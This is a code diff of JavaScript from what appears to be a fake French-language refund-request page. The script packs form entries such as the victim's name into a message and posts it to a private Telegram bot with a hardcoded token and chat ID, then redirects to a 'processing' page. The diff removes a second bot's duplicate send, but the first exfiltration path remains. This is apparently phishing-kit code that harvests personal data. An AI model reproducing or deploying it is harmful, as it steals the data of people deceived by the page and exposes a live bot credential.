@@ -235,10 +235,6 @@
     const token1 = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
     const chatId1 = "5372119436";
 
-    // توكن البوت الثاني
-    const token2 = "81362808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-    const chatId2 = "5372119436";
-
     const message = `
 🔔 **Nouvelle Demande de Remboursement** 🔔
 👤 Nom: ${nom}
@@ -263,18 +259,6 @@
             }),
         });
 
-        // إرسال الطلب إلى البوت الثاني
-        await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-                chat_id: chatId2,
-                text: message,
-                parse_mode: "Markdown",
-            }),
-        });
 
         // إعادة التوجيه بعد الإرسال
         window.location.href = "Traitement.html";
